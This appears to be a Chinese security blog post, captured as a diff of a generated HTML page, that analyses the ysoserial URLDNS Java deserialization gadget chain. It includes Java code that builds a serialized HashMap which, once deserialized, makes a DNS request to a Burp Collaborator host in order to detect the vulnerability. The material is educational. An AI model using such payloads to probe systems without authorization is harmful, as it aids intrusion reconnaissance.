@@ -1,0 +1,1025 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="视频：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV16h411z7o9&#x2F;?spm_id_from&#x3D;333.788.top_right_bar_window_custom_collection.content.click&amp;vd_source&#x3D;525a280615063349bad5e187f6bfeec3  前言URLDNS链是ysoserial里的一个简单利用链 通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="URLDNS链">
+<meta property="og:url" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="视频：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV16h411z7o9&#x2F;?spm_id_from&#x3D;333.788.top_right_bar_window_custom_collection.content.click&amp;vd_source&#x3D;525a280615063349bad5e187f6bfeec3  前言URLDNS链是ysoserial里的一个简单利用链 通">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021190636381.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021190529307.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021191243904.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021213110105.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021213137644.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021192008128.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021192118707.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021192737644.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021195903203.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021195918656.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021200751007.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021200831092.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021201201642.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021201511111.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021202209695.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021202015292.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021205655504.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021211250680.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021211010241.png">
+<meta property="article:published_time" content="2025-10-21T13:43:14.000Z">
+<meta property="article:modified_time" content="2025-10-21T13:44:25.818Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/10/21/URLDNS%E9%93%BE/image-20251021190636381.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>URLDNS链 - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="URLDNS链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-21 21:43" pubdate>
+          2025年10月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          988 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">URLDNS链</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-10-21T21:44:25+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.top_right_bar_window_custom_collection.content.click&vd_source=525a280615063349bad5e187f6bfeec3">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.top_right_bar_window_custom_collection.content.click&amp;vd_source=525a280615063349bad5e187f6bfeec3</a></p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>URLDNS链是ysoserial里的一个简单利用链</p>
+<p>通过DNS请求检测是否存在Java反序列化漏洞，但是只能发起DNS请求，不能进行其他利用</p>
+<p>对JDK版本没有要求，只依赖原生类（不过调链子时发现在序列化时JDK17会出现无权限修改私有字段报错，最好使用JDK9以下的版本）</p>
+<h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p><code>URL</code>类继承了<code>java.io.Serializable</code>，是可以序列化的</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021190636381.png" srcset="/img/loading.gif" lazyload alt="image-20251021190636381"></p>
+<p>在<code>URL</code>类中有个常见的<code>hashCode()</code>函数</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021190529307.png" srcset="/img/loading.gif" lazyload alt="image-20251021190529307"></p>
+<p>在这个<code>hashCode</code>函数中调用了<code>handler</code>的<code>hashCode</code>函数</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021191243904.png" srcset="/img/loading.gif" lazyload alt="image-20251021191243904"></p>
+<p>进入<code>handler</code>的<code>hashCode</code>函数中可以看到调用了<code>getHostAddress()</code>函数，是根据域名获取地址，会进行域名解析，发送DNS请求</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021213110105.png" srcset="/img/loading.gif" lazyload alt="image-20251021213110105"></p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021213137644.png" srcset="/img/loading.gif" lazyload alt="image-20251021213137644"></p>
+<p>最后<code>InetAddress.getName</code>这里可以触发DNS请求</p>
+<p><strong>所以只要能调用到<code>URL</code>类中的<code>hashCode()</code>函数，就可以发起DNS请求，验证是否存在漏洞</strong></p>
+<p>在<code>HashMap</code>中的<code>readObject()</code>函数中可以看到调用了<code>hash()</code>函数</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021192008128.png" srcset="/img/loading.gif" lazyload alt="image-20251021192008128"></p>
+<p>跟进可以看到在<code>hash()</code>函数中调用了<code>hashCode()</code>函数</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021192118707.png" srcset="/img/loading.gif" lazyload alt="image-20251021192118707"></p>
+<p>所以进行构造，入口类就是<code>HashMap</code>类，执行类就是<code>URL</code>类，都有相同名称类型的<code>hashCode()</code>方法</p>
+<p>看<code>URL</code>的构造函数知道直接传入一个URL网址即可，可以使用BurpSuite的Collaborator生成一个</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021192737644.png" srcset="/img/loading.gif" lazyload alt="image-20251021192737644"></p>
+<p>最后序列化<code>hashmap</code>即可</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021195903203.png" srcset="/img/loading.gif" lazyload alt="image-20251021195903203"></p>
+<p>然后立即轮询，正常在序列化时是什么都不会发生的，但是会发现在序列化的时候就会发起多次DNS查询，并且进行反序列化后并不会有DNS请求</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021195918656.png" srcset="/img/loading.gif" lazyload alt="image-20251021195918656"></p>
+<p>跟进<code>hashmap</code>的<code>put</code>中，会发现此时就会调用<code>hash()</code>方法</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021200751007.png" srcset="/img/loading.gif" lazyload alt="image-20251021200751007"></p>
+<p>进而调用了<code>hashCode()</code>方法，所以会发起DNS请求</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021200831092.png" srcset="/img/loading.gif" lazyload alt="image-20251021200831092"></p>
+<p>所以当代码运行到下面这段代码时就会发起DNS请求，会影响对是否存在反序列化漏洞的判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://q3uy1mhj5wykolrewrdopeeqyh49szgo.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<p>重新回到<code>URL</code>类中的<code>hashCode</code>函数，可以发现这里存在一个判断：如果<code>hashCode != -1</code>就会直接返回<code>hashCode</code>，不会执行到下面的<code>handler</code>的<code>hashCode</code>函数，也就不会触发<code>getHostAddress()</code>函数，所以在反序列化时不会发起DNS查询</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021201201642.png" srcset="/img/loading.gif" lazyload alt="image-20251021201201642"></p>
+<p>这里<code>hashCode</code>在初始化的时候是<code>-1</code></p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021201511111.png" srcset="/img/loading.gif" lazyload alt="image-20251021201511111"></p>
+<p>在执行完<code>hashmap.put(new URL(&quot;http://q3uy1mhj5wykolrewrdopeeqyh49szgo.oastify.com&quot;),1);</code>这句代码之后就变成了输入的URL的<code>hashCode</code>，可以通过调试查看此时的<code>hashCode</code>的值已经不是<code>-1</code>了</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021202209695.png" srcset="/img/loading.gif" lazyload alt="image-20251021202209695"></p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021202015292.png" srcset="/img/loading.gif" lazyload alt="image-20251021202015292"></p>
+<p>现在就是要在执行<code>hashmap.put(new URL(&quot;http://q3uy1mhj5wykolrewrdopeeqyh49szgo.oastify.com&quot;),1);</code>时不要发起DNS请求，在执行完这句代码后、序列化之前，将<code>hashCode</code>改回<code>-1</code>，从而可以在反序列化时发起DNS请求</p>
+<p>这就需要利用反射来改变已有的对象属性，将<code>hashCode</code>改回<code>-1</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(person);<br><br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        <span class="hljs-comment">// 这里不要发起请求，把URL对象的hashcode改成不是-1</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://q3uy1mhj5wykolrewrdopeeqyh49szgo.oastify.com&quot;</span>);<br>        <span class="hljs-comment">// 这里把hashcode改回-1，通过反射改变已有对象的属性</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">123456</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br><br>        serialize(hashmap);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>此时序列化是不会发起DNS请求</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021205655504.png" srcset="/img/loading.gif" lazyload alt="image-20251021205655504"></p>
+<p>然后反序列化可以看到有一次DNS请求</p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021211250680.png" srcset="/img/loading.gif" lazyload alt="image-20251021211250680"></p>
+<p>在判断<code>hashCode</code>值这里下一个断点，然后调试反序列化代码，可以看到此时这里的<code>hashCode</code>的值为<code>-1</code></p>
+<p><img src="/2025/10/21/URLDNS%E9%93%BE/image-20251021211010241.png" srcset="/img/loading.gif" lazyload alt="image-20251021211010241"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li><strong>入口类：</strong><code>HashMap</code>类：入口类的<code>HashMap.readObject</code>中的<code>HashMap.hash</code>中的<code>Object.hashCode</code></li>
+<li><strong>调用类：</strong><code>URL</code>类：通过调用<code>URL.hashCode</code>中的<code>URLStreamHandler.hashCode</code>中的<code>URLStreamHandler.getHostAddress</code>中的<code>InetAddress.getByName</code>来发起DNS请求</li>
+<li><strong>相同名称类型的函数：</strong><code>hashCode</code></li>
+<li><code>HashMap</code>可以接收<code>Object</code>对象，所以可以将<code>URL</code>类的实例化对象传入<code>HashMap</code>中，最终在<code>HashMap</code>中调用的不是<code>Object.hashCode</code>，而是<code>URLStreamHandler.hashCode</code></li>
+</ul>
+<p>所以URLDNS的利用链是：</p>
+<ol>
+<li><code>HashMap.readObject()</code></li>
+<li><code>HashMap.hash()</code></li>
+<li><code>URL.hashCode()</code></li>
+<li><code>URLStreamHandler.hashCode()</code></li>
+<li><code>URLStreamHandler.getHostAddress()</code></li>
+<li><code>InetAddress.getByName()</code></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8%E9%93%BE/" class="category-chain-item">利用链</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>URLDNS链</div>
+      <div>https://yschen20.github.io/2025/10/21/URLDNS链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月21日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年10月21日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/20/Java%E5%8F%8D%E5%B0%84/" title="Java反射">
+                        <span class="hidden-mobile">Java反射</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
